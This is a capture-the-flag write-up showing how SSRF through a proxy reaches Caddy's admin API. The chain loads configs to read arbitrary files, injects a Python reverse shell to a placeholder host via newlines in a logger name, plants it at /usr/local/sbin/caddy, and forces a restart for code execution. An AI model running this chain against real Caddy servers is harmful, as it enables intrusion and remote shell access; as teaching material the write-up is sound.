# Writeup
You're provided with a proxy service that can open and serve any remote http(s) host for you. To do so, make a request to the `http://service/{hostname}/{path}`

## 1. Caddy admin API

By default caddy creates admin API handlers described in [documentation](https://caddyserver.com/docs/api). In this task we explore how a basic SSRF can lead to an RCE in a caddy container.

You can access the admin API via proxying to localhost:2019 like this:
```sh
    curl http://service/localhost:2019/config/
```

## 2. Ability to read files

By using POST /load we can expand our file_server to read any files:

To do it, add this lines to the original Caddyfile:
```
    handle_path /files/* {
		root * /
		file_server browse {
			root /
		}
	}
```

Then, generate JSON representation of this config:
```
	caddy adapt --config ./caddyfile_read --adapter caddyfile
```

Or just edit the raw JSON. You can find JSON for file server in [fileserver.json](./fileserver.json)

Sending POST request to http://127.0.0.1:2019/load and with this new config we can now access any files using /file handler.

```sh
curl -v http://service/localhost:2019/load --json @fileserver.json
```

## 3. Write to files

We can write a partially-controlled content to arbitrary files on the system. When loading configs in JSON format, almost any field will decode and proceed with special characters, including newlines.

By making a logger with the desired output filename and name such as `kek\n\nsome_shell_code\n\n` we can make it that the resulting file will contain this shell code on a separate lines. The resulting log file will look like this:
```shell
2025/05/03 16:53:24.928 INFO    http.log.access.kek

python -c "..."

kek     handled request {"request": {"remote_ip": "172.17.0.1", "....
```

Despite multiple "no such file or directory" complains, bash will continue to run the code.

An example logger name that can be used to open a reverse shell looks like this:

```
"kek\n\npython$IFS-c$IFS'a=__import__;s=a(\"socket\").socket;o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s();c.connect((\"<rev_shell_ip>\",1234));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")'\n\nkek"
```

This is a basic python reverse shell with spaces replaced to $IFS (newlines are allowed, spaces not).


## 4. Replace `caddy` with our script

As you can see in the Dockerfile, caddy is being continuosly restarted on exit. This may look weird from the first glance, but this is actually the same as `restart: always` in the docker-compose. This mimic is added because of how we run the per-team containers.

We already have read and write, now we want an exec. To do so, we can abuse the restarting policy and search priority in the `PATH` environment variable. First entry in the `PATH` is `/usr/local/sbin/`, where `caddy` binary is not presented. That's good, we can create one since caddy container is being run from `root`. Normally, getting the right permissions on this file would be tricky, but luckily for us, caddy has a special handler to set whatever permission mask we want.

Resulting log directive looks like this:
```
    log kek\n\npython$IFS-c$IFS'a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("<rev_shell_ip>",1234));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'\n\nkek {
        format filter {
            wrap console
        }

        output file /usr/local/sbin/caddy {
            mode 777
        }
    }
```

Converted exploit json could be found at [rce.json](./rce.json)

- We will write the script file to the new file `/usr/local/sbin/caddy`
- It will be created with `777` permissions
- When new shell will check the `PATH` it would recieve this file instead of the original caddy

## 5. Induce a restart in the docker container

Last but not least, we need to somehow restart or crash the caddy. There's a gadget for that too! Just make a `POST /stop` request to the caddy admin api. Upon restart it will run our revese shell instead of the original caddy.

## 6. Execute /flag.sh

There's a /flag.sh file in the system's root. It has a 0000 permission mask with dropped CAP_DAC_OVERRIDE, so you will not be able to read it using just the trick from the second part of the writeup. You will explicitly need the ability to execute commands. After getting the reverse shell you can use `chmod` to override the permissions.

```sh
chmod 777 /flag.sh
/flag.sh
```